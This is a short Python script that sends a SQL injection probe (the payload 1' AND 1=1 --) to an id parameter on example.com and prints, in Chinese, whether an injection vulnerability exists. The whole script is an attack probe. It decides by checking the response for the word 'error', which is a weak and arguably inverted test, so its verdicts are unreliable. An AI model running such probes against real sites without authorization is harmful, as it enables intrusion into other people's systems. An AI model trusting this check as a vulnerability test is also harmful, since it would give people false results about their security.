
```
import requests

target_url = 'http://example.com'
payload = "1' AND 1=1 -- "

url = target_url + '?id=' + payload
response = requests.get(url)

if 'error' in response.text:
    print('SQL注入漏洞存在！')
else:
    print('SQL注入漏洞不存在！')
```